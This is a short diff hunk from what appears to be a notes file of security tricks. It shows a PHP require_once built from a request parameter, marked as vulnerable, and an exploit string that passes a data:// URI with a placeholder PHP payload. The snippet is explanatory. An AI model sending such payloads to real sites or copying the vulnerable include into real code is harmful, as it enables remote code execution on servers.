@@ -37,4 +37,3 @@ tricks:
       # Vulnerable code:
       require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php');
       # Exploit: wp_abspath=data://text/plain,<?php MALICIOUS_CODE ?>
-
